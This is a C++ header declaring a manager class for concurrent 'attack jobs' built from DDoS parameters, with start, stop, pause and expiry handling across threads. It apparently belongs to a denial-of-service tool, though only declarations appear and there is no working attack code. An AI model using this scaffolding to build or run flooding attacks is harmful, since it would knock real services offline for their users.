#ifndef _ATTACK_MGR_H
#define _ATTACK_MGR_H

#include <list>
#include "CAttack.h"

typedef std::list<CAttack*> ATTACK_LIST;
typedef ATTACK_LIST::iterator ATTACK_LIST_Itr;

class CAttackMgr {
public:
	CAttackMgr();
	virtual ~CAttackMgr();

	int32_t init();
	void destroy();

	int start();
	void stop();
	bool is_all_stopped();

	void self_check_stopped();
	void post_out(uint64_t eclipase_sec);

	CAttack* add_attack_job(CDDoSParam &ddos_params);
	void del_attack_job(CAttack *attk_job);

	void expire_handle();
	void attack_handle(int thrd_index, bool *is_all_job_stopped, bool *is_all_job_paused);

private:
	MUTEX_TYPE m_job_lock;
	ATTACK_LIST m_attk_jobs;
};

extern CAttackMgr g_attackMgr;

#endif